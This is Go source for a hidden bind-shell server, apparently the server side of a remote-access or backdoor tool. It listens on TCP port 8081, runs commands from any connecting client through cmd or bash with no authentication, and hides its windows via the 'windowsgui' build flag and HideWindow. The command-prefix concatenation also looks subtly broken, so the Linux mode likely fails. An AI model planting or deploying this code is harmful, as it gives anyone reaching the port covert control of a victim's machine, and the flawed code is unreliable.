//go build -ldflags "-s -H windowsgui" server.go
package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/text/encoding/charmap"
)
/*Set the parameter for use, "win" - for use of a server part on the operational systems of the Windows family, 
or "lin" - for use of a server part to linux similar systems.
*/
var osName = "win" // "win" or "lin"

var shell string
var arSh string

func main() {

	if osName != "lin" {
		shell = "cmd"
		arSh = "/c"
	} else {
		shell = "bash"
		arSh = "-c"
	}

	ln, _ := net.Listen("tcp", ":8081")
	conn, _ := ln.Accept()
	for {
		connbuf := bufio.NewReader(conn)
		str, err := connbuf.ReadString('\n')
		if err != nil {
			break
		}
		message := arSh + strings.TrimRight(str, "\r\n")

		Result := winShellExe(shell, string(message))
		conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
	}

	conn.Close()
}

func winShellExe(shell string, strCommand string) (out string) {

	argsCommand := strings.Split(strCommand, " ")
	cmd := exec.Command(shell, argsCommand...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, _ := cmd.Output()
	d := charmap.CodePage866.NewDecoder()
	decodeOut, _ := d.Bytes(stdout)
	out = string(decodeOut)
	return
}
